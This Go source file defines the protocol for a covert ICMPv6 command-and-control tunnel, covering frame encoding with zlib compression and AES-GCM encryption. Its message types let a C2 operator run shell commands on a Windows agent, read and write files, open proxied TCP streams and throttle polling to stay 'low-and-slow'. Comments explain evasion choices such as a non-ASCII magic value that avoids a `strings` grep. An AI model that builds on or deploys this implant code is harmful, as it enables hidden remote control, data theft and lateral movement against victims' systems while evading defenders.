// Package protocol defines the wire format for frames exchanged through the
// ICMPv6 Echo Request/Reply tunnel.
//
// Each ICMPv6 payload carries exactly one frame of PayloadSize bytes:
//
//	┌────────────┬──────┬───────┬───────────┬───────┬──────────┬────────────────────┐
//	│  Magic (8) │ Type │ Flags │ StreamID  │ SeqNo │ DataLen  │ Data … zero-padding│
//	│            │  (1) │  (1)  │   (4 BE)  │(4 BE) │  (2 BE)  │ (DataLen bytes)    │
//	└────────────┴──────┴───────┴───────────┴───────┴──────────┴────────────────────┘
//	                                                             Total fixed = 1200 B
//
// Flags bit 0 (FlagCompressed): the Data field is zlib-compressed.
// Flags bit 1 (FlagEncrypted):  the Data field is AES-256-GCM encrypted.
// Encode applies compression first, then encryption (compress-then-encrypt).
// Decode reverses: decrypt first, then decompress. Callers always receive
// plaintext — both flags are cleared in the returned Frame.
//
// The fixed size means the Windows agent always sends and receives 1200-byte
// ICMPv6 payloads, keeping network traffic uniform and simplifying the
// Icmp6SendEcho2 reply-buffer sizing.
package protocol

import (
	"crypto/cipher"
	"encoding/binary"
	"errors"
	"fmt"
)

// PayloadSize is the fixed ICMPv6 payload size for every tunnel frame.
// Chosen to stay below the IPv6 minimum MTU (1280) minus headers (40+8=48),
// with extra headroom. All frames are zero-padded to this length.
const PayloadSize = 1200

// HeaderSize is the byte length of the fixed frame header:
//
//	8 (magic) + 1 (type) + 1 (flags) + 4 (stream) + 4 (seq) + 2 (datalen) = 20
const HeaderSize = 20

// MaxData is the maximum application payload bytes per frame.
// The actual uncompressed payload may be larger when FlagCompressed is set;
// the wire-level compressed bytes must fit within MaxData.
const MaxData = PayloadSize - HeaderSize

// Magic is an 8-byte non-printable sentinel that identifies our frames.
// Using raw bytes (not an ASCII string) avoids a trivial `strings` grep.
var Magic = [8]byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}

// ─── message types ────────────────────────────────────────────────────────────

const (
	// TypeHello is sent by the agent on startup and as a periodic heartbeat.
	// It carries no payload (DataLen = 0).
	TypeHello = byte(0x01)

	// TypeData carries raw stream bytes in both directions.
	// StreamID identifies which logical connection the bytes belong to.
	TypeData = byte(0x02)

	// TypeStreamOpen is sent from C2 → agent to instruct the agent to
	// open a TCP connection to a target. The payload encodes the target
	// address (see EncodeStreamOpen / DecodeStreamOpen).
	TypeStreamOpen = byte(0x03)

	// TypeStreamClose is sent by either side to terminate a stream.
	TypeStreamClose = byte(0x04)

	// TypeCmd is sent from C2 → agent. The payload is a shell command string.
	TypeCmd = byte(0x05)

	// TypeCmdOut is sent from agent → C2. The payload is command output.
	TypeCmdOut = byte(0x06)

	// TypeFileGet requests the agent to read a local file and return it.
	// Payload = UTF-8 file path.
	TypeFileGet = byte(0x07)

	// TypeFilePut instructs the agent to write a file. Payload format:
	//   [2 bytes big-endian path length][path bytes][file data chunk]
	TypeFilePut = byte(0x08)

	// TypeFileData carries a chunk of file content (upload or download).
	TypeFileData = byte(0x09)

	// TypeFileEnd signals the end of a file transfer on a given stream.
	TypeFileEnd = byte(0x0A)

	// TypeAck is a generic acknowledgment (no data).
	TypeAck = byte(0x0B)

	// TypeError signals an error condition; payload is an ASCII description.
	TypeError = byte(0x0C)

	// TypeNoop is sent when a poll cycle has no real data to carry.
	TypeNoop = byte(0x0D)

	// TypeSetPoll is sent from C2 → agent to adjust the polling interval.
	// Payload: 4-byte big-endian uint32 = new interval in milliseconds.
	// The agent applies the change immediately on the next ticker reset.
	// Useful to slow the agent down to X minutes when idle (low-and-slow) and
	// wake it back to fast polling when the operator needs it.
	TypeSetPoll = byte(0x0E)
)

// ─── SOCKS5 address types (reused from RFC 1928) ─────────────────────────────

const (
	AddrIPv4   = byte(0x01) // 4-byte IPv4 address
	AddrDomain = byte(0x03) // 1-byte length prefix + domain
	AddrIPv6   = byte(0x04) // 16-byte IPv6 address
)

// ─── errors ───────────────────────────────────────────────────────────────────

var (
	// ErrBadMagic is returned when the magic sentinel does not match.
	ErrBadMagic = errors.New("protocol: bad magic")
	// ErrTooLarge is returned when DataLen exceeds MaxData.
	ErrTooLarge = errors.New("protocol: data too large for one frame")
	// ErrTruncated is returned when the buffer is shorter than expected.
	ErrTruncated = errors.New("protocol: buffer truncated")
)

// ─── frame type ───────────────────────────────────────────────────────────────

// Frame is a decoded tunnel protocol frame.
type Frame struct {
	Type byte
	// Flags carries per-frame option bits (FlagCompressed, FlagEncrypted).
	// Callers do not need to set this field; Encode manages it automatically.
	Flags    byte
	StreamID uint32
	SeqNo    uint32
	Data     []byte // application payload (already decompressed after Decode)
}

// ─── encode / decode ──────────────────────────────────────────────────────────

// Encode serialises f into a fixed-size [PayloadSize]byte slice.
//
// Processing order:
//  1. If len(f.Data) >= compressMinLen, attempt zlib compression (FlagCompressed).
//  2. If aead is non-nil, encrypt with AES-256-GCM (FlagEncrypted).
//
// Both flags are set automatically. ErrTooLarge is returned if the final
// encoded data exceeds MaxData (use EncMaxData as limit when PSK is active).
func Encode(f *Frame, crypt ...cipher.AEAD) ([]byte, error) {
	var aead cipher.AEAD
	if len(crypt) > 0 {
		aead = crypt[0]
	}

	data := f.Data
	flags := byte(0)

	// Step 1: Attempt compression for payloads above the minimum threshold.
	if len(data) >= compressMinLen {
		if compressed, err := zlibCompress(data); err == nil && len(compressed) < len(data) {
			data = compressed
			flags |= FlagCompressed
		}
	}

	// Step 2: Encrypt (compress-then-encrypt ordering).
	if aead != nil && len(data) > 0 {
		encrypted, err := sealData(aead, data)
		if err != nil {
			return nil, fmt.Errorf("protocol encode: %w", err)
		}
		data = encrypted
		flags |= FlagEncrypted
	}

	if len(data) > MaxData {
		return nil, ErrTooLarge
	}

	buf := make([]byte, PayloadSize) // zero-initialised (padding included)
	copy(buf[0:8], Magic[:])
	buf[8] = f.Type
	buf[9] = flags
	binary.BigEndian.PutUint32(buf[10:14], f.StreamID)
	binary.BigEndian.PutUint32(buf[14:18], f.SeqNo)
	binary.BigEndian.PutUint16(buf[18:20], uint16(len(data)))
	if len(data) > 0 {
		copy(buf[20:], data)
	}
	return buf, nil
}

// Decode parses a received ICMPv6 payload into a Frame.
// The payload must be at least HeaderSize bytes; excess bytes are padding and
// are ignored. Returns ErrBadMagic if the magic sentinel is wrong.
//
// Processing order (reverse of Encode):
//  1. If FlagEncrypted: decrypt with aead (required; returns ErrDecryptFailed if nil or wrong key).
//  2. If FlagCompressed: decompress transparently.
//
// Both flags are cleared in the returned Frame — callers always receive plaintext.
func Decode(payload []byte, crypt ...cipher.AEAD) (*Frame, error) {
	var aead cipher.AEAD
	if len(crypt) > 0 {
		aead = crypt[0]
	}

	if len(payload) < HeaderSize {
		return nil, ErrTruncated
	}
	// Verify magic sentinel
	for i, b := range Magic {
		if payload[i] != b {
			return nil, ErrBadMagic
		}
	}
	flags := payload[9]
	dataLen := int(binary.BigEndian.Uint16(payload[18:20]))
	if dataLen > MaxData {
		return nil, ErrTooLarge
	}
	if len(payload) < HeaderSize+dataLen {
		return nil, ErrTruncated
	}
	data := make([]byte, dataLen)
	if dataLen > 0 {
		copy(data, payload[20:20+dataLen])
	}

	// Step 1: Decrypt before decompressing (reverse of Encode ordering).
	if flags&FlagEncrypted != 0 {
		if aead == nil {
			return nil, ErrDecryptFailed
		}
		decrypted, err := openData(aead, data)
		if err != nil {
			return nil, err
		}
		data = decrypted
		flags &^= FlagEncrypted
	}

	// Step 2: Decompress transparently if the sender set FlagCompressed.
	if flags&FlagCompressed != 0 {
		decompressed, err := zlibDecompress(data)
		if err != nil {
			return nil, fmt.Errorf("protocol decode: %w", err)
		}
		data = decompressed
		flags &^= FlagCompressed // clear internal flag before exposing to caller
	}

	return &Frame{
		Type:     payload[8],
		Flags:    flags,
		StreamID: binary.BigEndian.Uint32(payload[10:14]),
		SeqNo:    binary.BigEndian.Uint32(payload[14:18]),
		Data:     data,
	}, nil
}

// ─── helper: TypeStreamOpen payload ──────────────────────────────────────────

// EncodeStreamOpen serialises a target address into the payload for a
// TypeStreamOpen frame.  addrType is one of AddrIPv4, AddrIPv6, AddrDomain.
// For AddrDomain the caller must pass the raw domain bytes (no length prefix;
// the prefix is added here).
func EncodeStreamOpen(addrType byte, addr []byte, port uint16) []byte {
	buf := make([]byte, 1+1+len(addr)+2)
	buf[0] = addrType
	buf[1] = byte(len(addr))
	copy(buf[2:], addr)
	binary.BigEndian.PutUint16(buf[2+len(addr):], port)
	return buf
}

// DecodeStreamOpen parses a TypeStreamOpen payload and returns the target
// address type, raw address bytes, and port number.
func DecodeStreamOpen(data []byte) (addrType byte, addr []byte, port uint16, err error) {
	if len(data) < 4 {
		return 0, nil, 0, ErrTruncated
	}
	addrType = data[0]
	addrLen := int(data[1])
	if len(data) < 2+addrLen+2 {
		return 0, nil, 0, ErrTruncated
	}
	addr = make([]byte, addrLen)
	copy(addr, data[2:2+addrLen])
	port = binary.BigEndian.Uint16(data[2+addrLen : 2+addrLen+2])
	return
}

// ─── helper: TypeFilePut payload ──────────────────────────────────────────────

// EncodeFilePut encodes the first chunk of a file-put frame:
//
//	[2-byte big-endian path length][path bytes][first data bytes]
func EncodeFilePut(path string, firstChunk []byte) []byte {
	pLen := uint16(len(path))
	buf := make([]byte, 2+int(pLen)+len(firstChunk))
	binary.BigEndian.PutUint16(buf[0:2], pLen)
	copy(buf[2:], path)
	copy(buf[2+pLen:], firstChunk)
	return buf
}

// ─── helper: TypeSetPoll payload ─────────────────────────────────────────────

// EncodeSetPoll serialises pollMs into a 4-byte big-endian payload for a
// TypeSetPoll frame.
func EncodeSetPoll(pollMs uint32) []byte {
	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, pollMs)
	return buf
}

// DecodeSetPoll parses a TypeSetPoll payload and returns the new poll interval
// in milliseconds. Returns ErrTruncated if the payload is too short.
func DecodeSetPoll(data []byte) (uint32, error) {
	if len(data) < 4 {
		return 0, ErrTruncated
	}
	return binary.BigEndian.Uint32(data[:4]), nil
}

// DecodeFilePut splits a TypeFilePut payload into path and first data chunk.
func DecodeFilePut(data []byte) (path string, firstChunk []byte, err error) {
	if len(data) < 2 {
		return "", nil, ErrTruncated
	}
	pLen := int(binary.BigEndian.Uint16(data[0:2]))
	if len(data) < 2+pLen {
		return "", nil, ErrTruncated
	}
	path = string(data[2 : 2+pLen])
	firstChunk = data[2+pLen:]
	return
}
